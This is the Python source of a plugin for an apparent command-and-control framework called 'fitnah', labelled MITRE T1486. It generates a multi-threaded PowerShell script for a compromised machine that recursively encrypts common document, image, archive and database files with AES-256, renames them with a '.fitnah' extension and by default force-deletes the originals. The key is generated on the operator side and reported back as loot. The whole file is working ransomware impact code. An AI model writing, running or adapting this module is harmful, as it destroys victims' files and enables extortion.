"""impact/encrypt_files — High-performance AES-256-CBC multi-threaded encryption. MITRE T1486"""
import os
import base64
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class EncryptFiles(BasePlugin):
    NAME        = "encrypt_files"
    DESCRIPTION = "High-performance AES-256-CBC encryption with multi-threading and secure deletion."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1486"
    CATEGORY    = "impact"
    schema      = ParamSchema().add(
        Param("path",    str, required=True,  help="Target directory to encrypt"),
        Param("ext",     str, required=False, default=".fitnah",
              help="Extension appended to encrypted files (default: .fitnah)"),
        Param("filter",  str, required=False, default="*.doc,*.docx,*.xls,*.xlsx,*.ppt,*.pptx,*.pdf,*.txt,*.jpg,*.png,*.zip,*.rar,*.7z,*.sql,*.db",
              help="File filter (comma separated)"),
        Param("key_b64", str, required=False, default="",
              help="AES-256 key as base64 (32 bytes). Auto-generated if omitted."),
        Param("threads", int, required=False, default=4,
              help="Number of concurrent encryption threads"),
        Param("delete_orig", bool, required=False, default=True,
              help="Securely delete original files after encryption"),
    )

    @mitre("T1486")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
            
        path        = params["path"]
        ext         = params.get("ext", ".fitnah")
        flt         = params.get("filter", "*")
        key_b64     = params.get("key_b64", "").strip()
        threads     = params.get("threads", 4)
        delete_orig = params.get("delete_orig", True)

        # Generate key on C2 side if not provided
        if not key_b64:
            key_bytes = os.urandom(32)
            key_b64   = base64.b64encode(key_bytes).decode("ascii")

        filter_exprs = [f.strip() for f in flt.split(",") if f.strip()]
        filter_arr   = ",".join(f"'{fe}'" for fe in filter_exprs) if filter_exprs else "'*'"

        ps = (
            f"$keyB64 = '{key_b64}';"
            f"$ext = '{ext}';"
            f"$targetPath = '{path}';"
            f"$maxThreads = {threads};"
            f"$deleteOrig = {'$true' if delete_orig else '$false'};"
            
            "$code = {"
            "  param($file, $keyB64, $ext, $deleteOrig)"
            "  try {"
            "    $key = [Convert]::FromBase64String($keyB64);"
            "    $aes = [System.Security.Cryptography.Aes]::Create();"
            "    $aes.KeySize = 256; $aes.BlockSize = 128; $aes.Mode = 'CBC'; $aes.Padding = 'PKCS7';"
            "    $aes.Key = $key; $aes.GenerateIV(); $iv = $aes.IV;"
            "    $enc = $aes.CreateEncryptor();"
            "    $bytes = [System.IO.File]::ReadAllBytes($file.FullName);"
            "    $ms = New-Object System.IO.MemoryStream;"
            "    $ms.Write($iv, 0, $iv.Length);"
            "    $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $enc, 'Write');"
            "    $cs.Write($bytes, 0, $bytes.Length); $cs.FlushFinalBlock(); $cs.Close();"
            "    [System.IO.File]::WriteAllBytes($file.FullName + $ext, $ms.ToArray());"
            "    if ($deleteOrig) { Remove-Item $file.FullName -Force }"
            "    return \"[+] Encrypted: $($file.Name)\""
            "  } catch { return \"[-] Error: $($file.Name) - $($_.Exception.Message)\" }"
            "};"

            "$files = Get-ChildItem $targetPath -Recurse -File -Include @({filter_arr}) -EA SilentlyContinue | "
            "  Where-Object { -not $_.Name.EndsWith($ext) };"
            
            "Write-Output \"[*] Starting encryption on $($files.Count) files using $maxThreads threads...\";"
            
            "$jobs = @();"
            "foreach ($f in $files) {"
            "  while ((Get-Job -State Running).Count -ge $maxThreads) { Start-Sleep -Milliseconds 100 }"
            "  $jobs += Start-Job -ScriptBlock $code -ArgumentList $f, $keyB64, $ext, $deleteOrig"
            "}"
            
            "$results = Wait-Job $jobs | Receive-Job;"
            "Remove-Job $jobs;"
            "$results -join \"`n\";"
            "Write-Output \"[!] Impact operation complete.\";"
            "Write-Output \"[!] Key (B64): $keyB64\";"
        )
        
        r = ctx.ps(ps)
        if r["status"] != "ok":
            return ModuleResult.err(r["output"])
            
        return ModuleResult.ok(
            data=r["output"] + f"\n\nC2 Master Key: {key_b64}",
            loot_kind="encryption_report"
        )
